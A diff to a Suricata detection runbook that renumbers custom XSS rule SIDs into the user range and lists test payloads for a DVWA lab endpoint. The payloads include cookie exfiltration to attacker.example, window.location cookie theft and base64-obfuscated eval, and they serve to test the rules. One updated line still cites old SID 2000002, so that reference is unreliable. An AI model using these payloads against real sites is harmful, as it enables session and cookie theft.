@@ -64,8 +64,12 @@ sudo grep "rules loaded" /var/log/suricata/suricata.log | tail -1
 
 ## Signature ID conflict check
 
-The custom rules use SIDs 2000001–2000058. Before deploying, confirm no
-collision with sids loaded from any other ruleset:
+The custom rules use SIDs **1000001–1000058** in the standard user-rule
+range (1000000–1999999). The teammate-authored draft originally used
+2000001–2000058, which collides with the Emerging Threats Open reserved
+range (2000000–2999999) — Suricata refused to load it. The rules were
+renumbered into the user range. Before deploying, confirm no other
+collision:
 
 ```bash
 sudo grep -h "sid:" /var/lib/suricata/rules/*.rules \
@@ -87,36 +91,36 @@ AND do NOT fire on benign traffic.
 Target: DVWA Reflected XSS endpoint at `/vulnerabilities/xss_r/`.
 
 ```text
-# 1. Cookie exfiltration via fetch — should fire sid 2000001 / 2000002
+# 1. Cookie exfiltration via fetch — should fire sid 1000001 / 2000002
    <script>fetch('http://attacker.example/?c='+document.cookie)</script>
 
-# 2. Script tag + eval — should fire sid 2000015 / 2000016 / 2000017
+# 2. Script tag + eval — should fire sid 1000015 / 1000016 / 1000017
    <script>eval('alert(1)')</script>
 
-# 3. Cookie theft via window.location — should fire sid 2000009-2000011
+# 3. Cookie theft via window.location — should fire sid 1000009-1000011
    <script>window.location='http://x/?'+document.cookie</script>
 
-# 4. Base64-obfuscated cookie access — should fire sid 2000037-2000039
+# 4. Base64-obfuscated cookie access — should fire sid 1000037-1000039
    <script>eval(atob('ZG9jdW1lbnQuY29va2ll'))</script>
 ```
 
 ### P2 (high) — encoded tag injection
 
 ```text
-# 5. URL-encoded script tag — should fire sid 2000040
+# 5. URL-encoded script tag — should fire sid 1000040
    %3Cscript%3Ealert(1)%3C%2Fscript%3E
 
-# 6. Raw iframe injection — should fire sid 2000043
+# 6. Raw iframe injection — should fire sid 1000043
    <iframe src=http://x></iframe>
 ```
 
 ### P3 (low) — wide-net indicators
 
 ```text
-# 7. img with onerror — should fire sid 2000055 AND sid 2000057
+# 7. img with onerror — should fire sid 1000055 AND sid 1000057
    <img src=x onerror=alert(1)>
 
-# 8. innerHTML sink — should fire sid 2000052
+# 8. innerHTML sink — should fire sid 1000052
    ?test=document.innerHTML
 ```
 
